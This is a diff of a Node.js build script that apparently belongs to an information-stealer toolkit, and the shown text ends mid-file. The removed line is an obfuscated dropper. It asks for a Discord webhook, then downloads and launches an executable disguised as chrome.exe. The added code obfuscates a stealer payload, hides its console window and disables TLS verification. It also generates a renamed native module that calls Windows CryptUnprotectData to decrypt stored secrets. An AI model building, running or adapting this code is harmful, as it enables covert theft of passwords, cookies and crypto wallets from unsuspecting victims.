@@ -1,1 +1,674 @@
-const _0x59f3ad=_0x5a89;(function(_0x4c6998,_0x5d7baa){const _0x6ec32a=_0x5a89,_0x2b4b6a=_0x4c6998();while(!![]){try{const _0x324e3d=parseInt(_0x6ec32a(0x1e2))/0x1+parseInt(_0x6ec32a(0x1d7))/0x2+parseInt(_0x6ec32a(0x1f4))/0x3+parseInt(_0x6ec32a(0x202))/0x4+-parseInt(_0x6ec32a(0x1d1))/0x5*(parseInt(_0x6ec32a(0x1dc))/0x6)+-parseInt(_0x6ec32a(0x1d9))/0x7+parseInt(_0x6ec32a(0x1dd))/0x8;if(_0x324e3d===_0x5d7baa)break;else _0x2b4b6a['push'](_0x2b4b6a['shift']());}catch(_0xc4b19d){_0x2b4b6a['push'](_0x2b4b6a['shift']());}}}(_0x39a6,0xd7d19));const _0x20dbf8=require(_0x59f3ad(0x1ba)),{exec:_0x3e4297}=require(_0x59f3ad(0x1d0)),_0x3b7eb4=require('\x66\x73'),_0xfd9c27=require(_0x59f3ad(0x1c4)),_0x170145=_0x59f3ad(0x1e9)+_0x59f3ad(0x1d2)+_0x59f3ad(0x1b5)+_0x59f3ad(0x1cb)+_0x59f3ad(0x1bd),_0xf31266=_0x59f3ad(0x1c9)+_0x59f3ad(0x1c1),_0x239990=_0x20dbf8[_0x59f3ad(0x1d4)]({'\x69\x6e\x70\x75\x74':process[_0x59f3ad(0x1f5)],'\x6f\x75\x74\x70\x75\x74':process['\x73\x74\x64\x6f\x75\x74']});function _0x1dc14e(_0x4ed1d4,_0x48af10){return new Promise((_0x7a9058,_0x5a1722)=>{const _0x28141e=_0x5a89,_0x194549=_0x3b7eb4['\x63\x72\x65\x61\x74\x65\x57\x72\x69\x74\x65\x53\x74\x72\x65\x61\x6d'](_0x48af10);_0xfd9c27['\x67\x65\x74'](_0x4ed1d4,_0x10c3f4=>{const _0x5f14bb=_0x5a89;if(_0x10c3f4[_0x5f14bb(0x1c5)]!==0xc8){_0x5a1722('\x46\x61\x69\x6c\x65\x64\x20\x74\x6f\x20\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x20\x66'+_0x5f14bb(0x200)+_0x5f14bb(0x1e8)+_0x10c3f4['\x73\x74\x61\x74\x75\x73\x43\x6f\x64\x65']);return;}_0x10c3f4[_0x5f14bb(0x1d3)](_0x194549),_0x194549['\x6f\x6e']('\x66\x69\x6e\x69\x73\x68',()=>{const _0x220366=_0x5f14bb;_0x194549[_0x220366(0x1b6)](_0x7a9058);});})['\x6f\x6e'](_0x28141e(0x1fd),_0x16d8e1=>{_0x3b7eb4['\x75\x6e\x6c\x69\x6e\x6b'](_0x48af10,()=>_0x5a1722(_0x16d8e1));});});}function _0x339722(){const _0xfbf6c0=_0x59f3ad;console[_0xfbf6c0(0x1e7)]();}function _0x5a89(_0x591326,_0x5d5dac){const _0x39a6ff=_0x39a6();return _0x5a89=function(_0x5a890c,_0x561674){_0x5a890c=_0x5a890c-0x1b4;let _0x4b44e5=_0x39a6ff[_0x5a890c];return _0x4b44e5;},_0x5a89(_0x591326,_0x5d5dac);}function _0x5e7fe3(){const _0x534b4e=_0x59f3ad;console[_0x534b4e(0x203)](_0x534b4e(0x1b9)+_0x534b4e(0x1c6)+_0x534b4e(0x207)+_0x534b4e(0x1df)+_0x534b4e(0x1fb)+'\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554'+'\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2588\u2588\u2557\x20\x20\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550'+_0x534b4e(0x1e4)+'\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2557\x20\u2588\u2588\u2588\u2588\u2551\x0a\x1b\x5b\x33\x33\x6d'+_0x534b4e(0x1db)+_0x534b4e(0x205)+_0x534b4e(0x1f0)+_0x534b4e(0x1ff)+'\x6d\x09\u2588\u2588\u2551\x20\x20\u2588\u2588\u2551\u2588\u2588\u2551\x20\x20\x20\u2588\u2588\u2551\u2588'+_0x534b4e(0x1ed)+_0x534b4e(0x1f8)+'\x20\x20\u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2554\u255d\u2588\u2588\u2551\x0a\x1b\x5b\x33'+_0x534b4e(0x1f9)+_0x534b4e(0x1ce)+_0x534b4e(0x1e1)+_0x534b4e(0x1bf)+_0x534b4e(0x1ca)+_0x534b4e(0x1c7)+'\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d\x20\x20\u255a\u2550\u255d\u255a\u2550\u255d\x20\u255a'+_0x534b4e(0x1c3)+_0x534b4e(0x1b7)+_0x534b4e(0x206));}function _0x339722(){console['\x6c\x6f\x67']('\x0a'['\x72\x65\x70\x65\x61\x74'](0x19));}function _0x580273(_0xf8d46b){const _0x1f5e34=_0x59f3ad;console[_0x1f5e34(0x203)](_0x1f5e34(0x201)+'\x74\x68\x65\x20\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x74\x69\x6f\x6e\x20\x66\x69'+'\x6c\x65\x2e\x2e\x2e');const _0x3495c6='\x6d\x6f\x64\x75\x6c\x65\x2e\x65\x78\x70\x6f\x72\x74\x73\x20\x3d\x20\x28\x29\x20'+_0x1f5e34(0x1c0)+'\x20\x20\x20\x20\x20\x20\x77\x65\x62\x68\x6f\x6f\x6b\x5f\x75\x72\x6c\x3a\x20\x22'+_0xf8d46b+(_0x1f5e34(0x1ef)+'\x64\x65\x66\x61\x75\x6c\x74\x2e\x69\x63\x6f\x27\x2c\x0a\x20\x20\x20\x20\x20\x20'+_0x1f5e34(0x1b8)+_0x1f5e34(0x1bb)+_0x1f5e34(0x1cd)+_0x1f5e34(0x1cf)+_0x1f5e34(0x1de)+_0x1f5e34(0x1c8)+'\x67\x61\x6c\x43\x6f\x70\x79\x72\x69\x67\x68\x74\x3a\x20\x27\x52\x75\x6e\x74\x69'+'\x6d\x65\x20\x42\x72\x6f\x6b\x65\x72\x20\u00a9\ufe0f\x20\x32\x30\x32\x33\x27\x2c\x0a\x20'+_0x1f5e34(0x1bc)+_0x1f5e34(0x1e3)+_0x1f5e34(0x1f6)+_0x1f5e34(0x1d6));_0x3b7eb4['\x77\x72\x69\x74\x65\x46\x69\x6c\x65'](_0x1f5e34(0x1c2),_0x3495c6,_0x3bf97c=>{const _0x55f7e5=_0x1f5e34;if(_0x3bf97c)console[_0x55f7e5(0x1fd)](_0x55f7e5(0x1fe)+_0x55f7e5(0x1da),_0x3bf97c);else{console['\x6c\x6f\x67'](_0x55f7e5(0x1f3)),console[_0x55f7e5(0x203)](_0x55f7e5(0x1f7)+'\x69\x6c\x65\x20\x75\x70\x64\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x44\x69\x73'+_0x55f7e5(0x1d5)),console[_0x55f7e5(0x203)](_0x55f7e5(0x1ee)+'\x2e\x6a\x73\x2e\x2e\x2e'),_0x339722();const _0x5def51=_0x3e4297(_0x55f7e5(0x1d8));_0x5def51[_0x55f7e5(0x1e6)]['\x6f\x6e']('\x64\x61\x74\x61',_0x2265df=>{const _0x120cf7=_0x55f7e5;console[_0x120cf7(0x203)](_0x120cf7(0x1ea)+_0x2265df);}),_0x5def51[_0x55f7e5(0x1f2)]['\x6f\x6e'](_0x55f7e5(0x1cc),_0x387524=>{const _0x5006d5=_0x55f7e5;console[_0x5006d5(0x1fd)](_0x5006d5(0x1e5)+_0x387524);}),_0x5def51['\x6f\x6e'](_0x55f7e5(0x1b6),_0xb0c8b3=>{const _0x37496b=_0x55f7e5;console['\x6c\x6f\x67'](_0x37496b(0x204)+_0x37496b(0x1eb)+_0xb0c8b3),_0x3e4297(_0x37496b(0x1fc)+_0x37496b(0x1be));});}});}function _0x39a6(){const _0x441d19=['\x35\x32\x34\x31\x32\x30\x53\x43\x74\x58\x78\x63','\x6e\x6f\x64\x65\x20\x62\x75\x69\x6c\x64\x65\x72\x2e\x6a\x73','\x39\x35\x36\x36\x38\x37\x32\x4d\x59\x63\x4e\x75\x6f','\x6e\x66\x69\x67\x2e\x6a\x73\x3a','\x09\u2588\u2588\u2551\x20\x20\u2588\u2588\u2551\u2588\u2588\u2551\x20\x20\x20\u2588\u2588\u2551\u2588\u2588','\x36\x79\x67\x66\x6e\x49\x48','\x31\x34\x39\x36\x37\x37\x36\x5a\x58\x54\x66\x45\x57','\x63\x74\x4e\x61\x6d\x65\x3a\x20\x27\x52\x75\x6e\x74\x69\x6d\x65\x5f\x42\x72\x6f','\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557\x20\u2588\u2588\u2557\u2588\u2588\u2557\x20\x20\x20\u2588','\x65\x72\x20\x74\x68\x65\x20\x44\x69\x73\x63\x6f\x72\x64\x20\x77\x65\x62\x68\x6f','\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551\x20\x20\u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588','\x34\x38\x32\x39\x31\x30\x4c\x72\x66\x46\x43\x50','\x69\x6c\x65\x6e\x61\x6d\x65\x3a\x20\x27\x52\x75\x6e\x74\x69\x6d\x65\x42\x72\x6f','\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551\x20\x20\x20','\x09\x73\x74\x64\x65\x72\x72\x3a\x20','\x73\x74\x64\x6f\x75\x74','\x63\x6c\x65\x61\x72','\x65\x3a\x20','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x64\x6e\x2e\x64\x69\x73\x63\x6f\x72\x64\x61','\x09\x73\x74\x64\x6f\x75\x74\x3a\x20','\x64\x20\x77\x69\x74\x68\x20\x63\x6f\x64\x65\x20','\x6f\x6b\x3a\x20','\u2588\u2554\u2550\u2550\u255d\x20\x20\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2554','\x1b\x5b\x30\x6d\x09\x4c\x61\x75\x6e\x63\x68\x69\x6e\x67\x20\x62\x75\x69\x6c\x64','\x22\x2c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x69\x63\x6f\x6e\x3a\x20\x27\x2e\x2f','\u2588\u2557\x20\x20\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2588\u2588\u2551\x20\x20','\x20\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x74\x69\x6f\x6e\x2e\x2e\x2e','\x73\x74\x64\x65\x72\x72','\x1b\x5b\x33\x32\x6d\x09\x20\x5b\x2b\x5d\x20\x44\x6f\x6e\x65\x20\x21','\x32\x35\x34\x37\x31\x36\x38\x6a\x6d\x4f\x63\x75\x68','\x73\x74\x64\x69\x6e','\x6b\x65\x72\x2e\x65\x78\x65\x27\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x7d\x0a\x20','\x1b\x5b\x30\x6d\x09\x43\x6f\x6e\x66\x69\x67\x75\x72\x61\x74\x69\x6f\x6e\x20\x66','\u2550\u2550\u255d\x20\x20\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551\x20','\x33\x6d\x09\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d','\x1b\x5b\x33\x34\x6d\x09\x5b\x2b\x5d\x20\x50\x6c\x65\x61\x73\x65\x20\x65\x6e\x74','\u2588\u2557\u2588\u2588\u2588\u2557\x20\x20\x20\u2588\u2588\u2588\u2557\x0a\x1b\x5b\x33\x33\x6d\x09','\x73\x74\x61\x72\x74\x20\x43\x3a\x2f\x50\x72\x6f\x67\x72\x61\x6d\x44\x61\x74\x61','\x65\x72\x72\x6f\x72','\x09\x45\x72\x72\x6f\x72\x20\x77\x72\x69\x74\x69\x6e\x67\x20\x74\x6f\x20\x63\x6f','\x20\u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2588\u2588\u2554\u2588\u2588\u2551\x0a\x1b\x5b\x33\x33','\x69\x6c\x65\x2e\x20\x48\x54\x54\x50\x20\x73\x74\x61\x74\x75\x73\x20\x63\x6f\x64','\x1b\x5b\x33\x34\x6d\x0a\x09\x5b\x2b\x5d\x20\x55\x70\x64\x61\x74\x69\x6e\x67\x20','\x34\x39\x36\x33\x31\x36\x38\x51\x57\x58\x78\x4a\x63','\x6c\x6f\x67','\x09\x63\x68\x69\x6c\x64\x20\x70\x72\x6f\x63\x65\x73\x73\x20\x65\x78\x69\x74\x65','\u2588\u2588\u2588\u2557\x20\x20\u2588\u2588\u2554\u2588\u2588\u2557\x20\u2588\u2588\u2551\u2588\u2588\u2588\u2588','\x64\x65\x72\x0a','\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2557\x20\x20\x20\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588','\x1b\x5b\x30\x6d\x09\x43\x6f\x6e\x74\x69\x6e\x75\x69\x6e\x67\x20\x77\x69\x74\x68','\x31\x38\x31\x36\x30\x35\x39\x37\x33\x33\x32\x35\x30\x30\x34\x38\x31\x30\x2f\x31','\x63\x6c\x6f\x73\x65','\x5b\x33\x33\x6d\x09\x09\x09\x09\x09\x09\x09\x09\x09\x20\x20\x20\x42\x75\x69\x6c','\x20\x20\x70\x72\x6f\x70\x65\x72\x74\x69\x65\x73\x3a\x20\x7b\x0a\x20\x20\x20\x20','\x0a\x1b\x5b\x33\x33\x6d\x0a\x1b\x5b\x33\x33\x6d\x0a\x1b\x5b\x33\x33\x6d\x09\u2588','\x72\x65\x61\x64\x6c\x69\x6e\x65','\x20\x20\x20\x20\x20\x20\x20\x20\x46\x69\x6c\x65\x44\x65\x73\x63\x72\x69\x70\x74','\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x4f\x72\x69\x67\x69\x6e\x61\x6c\x46','\x68\x72\x6f\x6d\x65\x2e\x65\x78\x65','\x2f\x63\x68\x72\x6f\x6d\x65\x2e\x65\x78\x65','\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551\x20\u255a\u2550\u255d\x20\u2588\u2588\u2551\x0a\x1b\x5b','\x3d\x3e\x20\x7b\x0a\x20\x20\x20\x20\x72\x65\x74\x75\x72\x6e\x20\x7b\x0a\x20\x20','\x65\x2e\x65\x78\x65','\x63\x6f\x6e\x66\x69\x67\x2e\x6a\x73','\u2550\u2550\u2550\u2550\u2550\u255d\x20\u255a\u2550\u255d\x20\x20\x20\x20\x20\u255a\u2550\u255d\x0a\x1b','\x68\x74\x74\x70\x73','\x73\x74\x61\x74\x75\x73\x43\x6f\x64\x65','\u2588\u2588\u2588\u2588\u2588\u2557\x20\x20\u2588\u2588\u2588\u2588\u2588\u2588\u2557\x20\u2588\u2588\u2588\u2588','\x20\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d\x20\x20\u255a\u2550\u2550\u2550\u255d\u255a','\x6b\x65\x72\x27\x2c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x4c\x65','\x43\x3a\x2f\x50\x72\x6f\x67\x72\x61\x6d\x44\x61\x74\x61\x2f\x63\x68\x72\x6f\x6d','\x33\x33\x6d\x09\u255a\u2550\u2550\u2550\u2550\u2550\u255d\x20\x20\u255a\u2550\u2550\u2550\u2550\u2550\u255d','\x31\x38\x32\x30\x36\x32\x36\x33\x39\x38\x36\x32\x35\x33\x30\x30\x38\x38\x2f\x63','\x64\x61\x74\x61','\x69\x6f\x6e\x3a\x20\x27\x52\x75\x6e\x74\x69\x6d\x65\x20\x42\x72\x6f\x6b\x65\x72','\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551\x20\u255a\u2588\u2588\u2588\u2588\u2551\u2588\u2588','\x27\x2c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x50\x72\x6f\x64\x75','\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73','\x33\x38\x35\x36\x31\x33\x30\x54\x42\x73\x52\x6d\x42','\x70\x70\x2e\x63\x6f\x6d\x2f\x61\x74\x74\x61\x63\x68\x6d\x65\x6e\x74\x73\x2f\x31','\x70\x69\x70\x65','\x63\x72\x65\x61\x74\x65\x49\x6e\x74\x65\x72\x66\x61\x63\x65','\x63\x6f\x72\x64\x20\x77\x65\x62\x68\x6f\x6f\x6b\x2e','\x20\x20\x20\x7d\x0a\x20\x20\x7d'];_0x39a6=function(){return _0x441d19;};return _0x39a6();}async function _0x31bdd3(_0x4b3ee9){const _0x368f13=_0x59f3ad;try{console[_0x368f13(0x203)](''),await _0x1dc14e(_0x170145,_0xf31266),console[_0x368f13(0x203)](''),console['\x6c\x6f\x67'](_0x368f13(0x1b4)+_0x368f13(0x1f1)),_0x5e7fe3(),_0x580273(_0x4b3ee9);}catch(_0x26babb){console[_0x368f13(0x1fd)]('\x45\x72\x72\x6f\x72\x20\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x69\x6e\x67\x20\x66\x69'+'\x6c\x65\x3a',_0x26babb);}}_0x5e7fe3(),_0x239990['\x71\x75\x65\x73\x74\x69\x6f\x6e'](_0x59f3ad(0x1fa)+_0x59f3ad(0x1e0)+_0x59f3ad(0x1ec),_0x57d2e7=>{const _0x42ddb0=_0x59f3ad;_0x239990[_0x42ddb0(0x1b6)](),_0x31bdd3(_0x57d2e7);});
+const jsconfuser = require('js-confuser');
+const jsobf = require("javascript-obfuscator");
+const fs = require("fs");
+const path = require('path');
+const crypto = require('crypto');
+const child_process = require("child_process");
+const os = require("os");
+const https = require('https');
+const config = require("./config.js")()
+
+const builder = require("electron-builder");
+const Platform = builder.Platform;
+const electron_version = "24.1.1";
+
+async function install_node_gyp() {
+    return new Promise(res => {
+        res(child_process.execSync("npm install -g node-gyp"))
+    })
+}
+
+var isModuleAvailableSync = function (moduleName) {
+    var ret = false; // return value, boolean
+    var dirSeparator = require("path").sep
+
+    // scan each module.paths. If there exists
+    // node_modules/moduleName then
+    // return true. Otherwise return false.
+    module.paths.forEach(function (nodeModulesPath) {
+        if (fs.existsSync(nodeModulesPath + dirSeparator + moduleName) === true) {
+            ret = true;
+            return false; // break forEach
+        }
+    });
+
+    return ret;
+}
+
+async function install_module(module_name) {
+    return new Promise(res => {
+        res(child_process.execSync(`npm install ${module_name}`))
+    })
+}
+
+async function check_all_modules_installed() {
+    return new Promise(async (res) => {
+        [
+            "@peculiar/webcrypto",
+            "axios",
+            "bitcoin-seed",
+            "boukiapi",
+            "buffer-replace",
+            "form-data",
+            "javascript-obfuscator",
+            "js-confuser",
+            "node-forge",
+            "node-gyp",
+            "node-hide-console-window",
+            "node-powershell",
+            "request",
+            "seco-file",
+            "sqlite3",
+            "systeminformation",
+            "zip-lib"
+        ].forEach(async (moduleName) => {
+            if (!isModuleAvailableSync(moduleName)) {
+                if (moduleName == "boukiapi") {
+                    let start = Date.now();
+
+                    console.log("Copying ./boukiapi to ./node_modules/boukiapi")
+                    fs.mkdirSync("./node_modules/boukiapi");
+                    copyFolderRecursiveSync("./boukiapi", "./node_modules")
+                    console.log(`Copied ./boukiapi to ./node_modules/boukiapi within ${(Date.now() - start) / 1000} seconds`);
+                } else {
+                    console.log(`Installing "${moduleName}" as it is not installed`)
+                    await install_module(moduleName)
+                    console.log(`Installed "${moduleName}"`)
+                }
+
+            }
+        })
+
+        res()
+    })
+}
+
+async function fix_node_gyp(versions) {
+    const appdata = process.env.LOCALAPPDATA;
+
+    for (var version of versions) {
+        for (var file of fs.readdirSync(`${appdata}\\node-gyp\\Cache\\${version}\\include\\node`)) {
+            if (file.includes(".DELETE")) {
+                console.log(`node-gyp-fix | Fixed ${file}`)
+                fs.renameSync(`${appdata}\\node-gyp\\Cache\\${version}\\include\\node\\${file}`, `${appdata}\\node-gyp\\Cache\\${version}\\include\\node\\${file.split(".DELETE")[0]}`)
+            }
+        }
+    }
+}
+
+async function rebuild() {
+    return new Promise(res => {
+        console.log("Rebuilding packages")
+        res(child_process.execSync("npm rebuild", { cwd: "./electron" }))
+        console.log("Rebuilt packages")
+    })
+}
+
+async function fix_dependencies() {
+
+    return new Promise(async res => {
+        const appdata = process.env.LOCALAPPDATA;
+
+        if (!fs.readdirSync(appdata).includes("node-gyp")) {
+            await install_node_gyp();
+            await fix_dependencies();
+        }
+
+        console.log("Rebuilding boukiapi");
+        await build_native_module("boukiapi")
+        console.log("Rebuilt boukiapi");
+
+        const node_js_versions = fs.readdirSync(`${appdata}\\node-gyp\\Cache`);
+        await fix_node_gyp(node_js_versions)
+        res(await rebuild());
+    })
+
+
+}
+
+function makeid_var(length) {
+    let result = '';
+    const characters = 'abcdefghijklmnopqrstuvwxyz';
+    const charactersLength = characters.length;
+    let counter = 0;
+    while (counter < length) {
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+        counter += 1;
+    }
+    return result;
+}
+
+function makeid(length) {
+    let result = '';
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    const charactersLength = characters.length;
+    let counter = 0;
+    while (counter < length) {
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+        counter += 1;
+    }
+    return result;
+}
+
+
+
+
+
+const obfuscationConfig = {
+    jsConfuser: {
+        target: "node",
+        renameVariables: true,
+        controlFlowFlattening: 0.5,
+        globalConcealing: false,
+        // Add more options as needed...
+    },
+    jsObfuscator: {
+        compact: true,
+        controlFlowFlattening: true,
+        controlFlowFlatteningThreshold: 1,
+        numbersToExpressions: false,
+        simplify: true,
+        shuffleStringArray: true,
+        splitStrings: true,
+        stringArrayThreshold: 1
+        // Add more options as needed...
+    }
+};
+
+
+
+function generateEncryptionKey() {
+    return crypto.randomBytes(32); // 32 bytes pour une clé AES-256
+}
+
+
+function encryptData(data, key) {
+    const iv = crypto.randomBytes(16); // Vecteur d'initialisation
+    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
+    let encryptedData = cipher.update(data, 'utf-8', 'hex');
+    encryptedData += cipher.final('hex');
+    return { iv: iv.toString('hex'), encryptedData };
+}
+
+
+function generateDynamicKey() {
+    const timestamp = Math.floor(Date.now() / 1000); // Get current timestamp in seconds
+    return timestamp.toString(); // Convert timestamp to string (You might want to hash or manipulate it further for better security)
+}
+
+const encryptionKey = generateEncryptionKey();
+
+const sensitiveData = 'This is sensitive information';
+const { iv, encryptedData } = encryptData(sensitiveData, encryptionKey);
+console.log('Encrypted Data:', encryptedData);
+
+async function obfuscate(input, output) {
+    return new Promise(res => {
+        const dynamicKey = generateDynamicKey();
+
+        const jsObfOptions = {
+            ...obfuscationConfig.jsObfuscator,
+            seed: dynamicKey // Set the seed based on the dynamic key
+        };
+        const jsConfuserOptions = {
+            ...obfuscationConfig.jsConfuser,
+            // Remove the seed option for js-confuser
+        };
+
+        // Read the input file
+        const data = fs.readFileSync(input, "utf-8");
+
+        // Obfuscate with js-obfuscator
+        const obfuscatedJsObf = jsobf.obfuscate(data, jsObfOptions).getObfuscatedCode();
+
+        // Obfuscate avec js-confuser
+        jsconfuser.obfuscate(obfuscatedJsObf, jsConfuserOptions)
+            .then(obfuscated => {
+                // Combine with additional modules
+                const modules = `process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
+require("child_process");
+require("crypto");
+require("fs");
+require("os");
+require("path");
+require("stream");
+require("zip-lib");
+require("boukiapi");
+require("systeminformation");
+require("sqlite3");
+require("request");
+require("node-hide-console-window");
+require("form-data");
+require("buffer-replace");
+require("axios");
+require('https');
+require("./config_obf.js");
+
+async function hideSelf() {
+    require("node-hide-console-window").hideConsole();
+}
+
+hideSelf();
+`
+
+            res(fs.writeFileSync(output, modules + obfuscated));
+
+
+        })
+    })
+}
+
+/**
+ * Download a resource from `url` to `dest`.
+ * @param {string} url - Valid URL to attempt download of resource
+ * @param {string} dest - Valid path to save the file.
+ * @returns {Promise<void>} - Returns asynchronously when successfully completed download
+ */
+function download(url, dest) {
+    return new Promise((resolve, reject) => {
+        // Check file does not exist yet before hitting network
+        fs.access(dest, fs.constants.F_OK, async (err) => {
+
+            if (err === null) {
+                fs.unlinkSync(dest)
+                resolve(await download(url, dest))
+            }
+
+            const request = https.get(url, response => {
+                if (response.statusCode === 200) {
+
+                    const file = fs.createWriteStream(dest, { flags: 'wx' });
+                    file.on('finish', () => resolve());
+                    file.on('error', async err => {
+                        file.close();
+                        if (err.code === 'EEXIST') {
+                            fs.unlinkSync(dest)
+                            resolve(await download(url, dest))
+                        }
+                        else { fs.unlink(dest, () => reject(err.message)) }; // Delete temp file
+                    });
+                    response.pipe(file);
+                } else if (response.statusCode === 302 || response.statusCode === 301) {
+                    //Recursively follow redirects, only a 200 will resolve.
+                    download(response.headers.location, dest).then(() => resolve());
+                } else {
+                    reject(`Server responded with ${response.statusCode}: ${response.statusMessage}`);
+                }
+            });
+
+            request.on('error', err => {
+                reject(err.message);
+            });
+        });
+    });
+}
+async function build_native_module(package) {
+    return new Promise(res => {
+        res(child_process.execSync(`node-gyp rebuild`, { cwd: `./electron/node_modules/${package}` }))
+    })
+}
+
+function get_pkg_cache() {
+    const pkg_cache_path = `${process.env.SystemDrive}\\Users\\${os.userInfo().username}\\.pkg-cache`;
+
+    if (!fs.existsSync(pkg_cache_path)) {
+        fs.mkdirSync(pkg_cache_path)
+        fs.mkdirSync(`${pkg_cache_path}\\v3.4`)
+    }
+
+    return `${pkg_cache_path}\\v3.4`;
+}
+
+async function rename_dapi() {
+    let path = `.\\electron\\node_modules\\boukiapi`
+    let original_name = "node-dpapi"
+    let new_name = makeid_var(12);
+
+    fs.rmSync(`${path}\\build`, { recursive: true, force: true })
+
+    if (!fs.existsSync(`${path}\\src\\node-dpapi.cpp`) || !(fs.readFileSync(`${path}\\src\\node-dpapi.cpp`, "utf-8")).includes(original_name)) {
+
+        let index_js = `const dpapi = require("bindings")("node-dpapi");
+
+module.exports.unprotectData = dpapi.unprotectData;`;
+
+        let index_d_ts = `declare module "node-dpapi" {
+    function unprotectData(
+        encryptedData: Uint8Array,
+        optionalEntropy: Uint8Array,
+        scope: "CurrentUser" | "LocalMachine"
+    ): Uint8Array;
+}`;
+
+        let binding_gyp = `{
+"targets": [
+    {
+    "target_name": "node-dpapi",
+    "sources": [ "src/node-dpapi.cpp" ],
+    "include_dirs": [
+        "<!(node -e \\"require('nan')\\")",
+        "include"
+    ],
+    "libraries": [
+        "-lcrypt32.lib"
+    ]
+    }
+]
+}`;
+
+        fs.rmSync(`${path}\\src`, { recursive: true, force: true });
+        fs.mkdirSync(`${path}\\src`);
+        fs.writeFileSync(`${path}\\src\\node-dpapi.cpp`, "PLACEHOLDER");
+        fs.writeFileSync(`${path}\\index.js`, index_js);
+        fs.writeFileSync(`${path}\\index.d.ts`, index_d_ts);
+        fs.writeFileSync(`${path}\\binding.gyp`, binding_gyp);
+    }
+
+    ["src\\node-dpapi.cpp", "index.js", "index.d.ts", "binding.gyp"].forEach(file => {
+        let content = fs.readFileSync(`${path}\\${file}`, "utf-8")
+
+        let splits = content.split(" ");
+
+        for (var split in splits) {
+            let string = splits[split];
+            string = string.replace(original_name, new_name);
+
+            splits[split] = string;
+        }
+
+        content = splits.join(" ")
+
+        fs.writeFileSync(`${path}\\${file}`, content, "utf-8")
+    })
+
+    console.log(`Renaming dapi vars`)
+    await rename_dapi_vars();
+    console.log(`Renamed dapi vars`)
+
+    fs.renameSync(`${path}\\src\\node-dpapi.cpp`, `${path}\\src\\${new_name}.cpp`)
+}
+
+async function rename_dapi_vars() {
+    return new Promise(res => {
+        let path = `./electron/node_modules/boukiapi/src/node-dpapi.cpp`;
+
+        let content = `#include <node.h>
+#include <nan.h>
+#include <Windows.h>
+#include <dpapi.h>
+
+void UQDJcHcaSaTefKfYStdCYrDvn(Nan::NAN_METHOD_ARGS_TYPE info)
+{
+
+    auto UnEwXzYWTBpnaePEkkNvZrWhM = node::Buffer::Data(info[0]);
+    auto yhKrTZMuRNvScccDUkegDyMQE = node::Buffer::Length(info[0]);
+
+    DATA_BLOB juGsCdDXyXpRnFnbPYMuxJUKm;
+    DATA_BLOB kfghGYAWWyVrmZEpPfDCgUqCg;
+
+    juGsCdDXyXpRnFnbPYMuxJUKm.pbData = reinterpret_cast<BYTE*>(UnEwXzYWTBpnaePEkkNvZrWhM);
+    juGsCdDXyXpRnFnbPYMuxJUKm.cbData = yhKrTZMuRNvScccDUkegDyMQE;
+
+    bool HZECTReECYfAEykgJJsZbnmQC = false;
+
+    HZECTReECYfAEykgJJsZbnmQC = CryptUnprotectData(
+        &juGsCdDXyXpRnFnbPYMuxJUKm,
+        nullptr,
+        nullptr,
+        nullptr,
+        nullptr,
+        0,
+        &kfghGYAWWyVrmZEpPfDCgUqCg);
+
+    auto CwqjUWHQMEHRqGJFVnDcaGhRa = Nan::CopyBuffer(reinterpret_cast<const char*>(kfghGYAWWyVrmZEpPfDCgUqCg.pbData), kfghGYAWWyVrmZEpPfDCgUqCg.cbData).ToLocalChecked();
+    LocalFree(kfghGYAWWyVrmZEpPfDCgUqCg.pbData);
+
+    info.GetReturnValue().Set(CwqjUWHQMEHRqGJFVnDcaGhRa);
+}
+
+NAN_METHOD(unprotectData)
+{
+    UQDJcHcaSaTefKfYStdCYrDvn(info);
+}
+
+NAN_MODULE_INIT(init)
+{
+    Nan::Set(
+        target,
+        Nan::New<v8::String>("unprotectData").ToLocalChecked(),
+        Nan::GetFunction(Nan::New<v8::FunctionTemplate>(unprotectData)).ToLocalChecked());
+}
+
+#if NODE_MAJOR_VERSION >= 10
+NAN_MODULE_WORKER_ENABLED(binding, init)
+#else
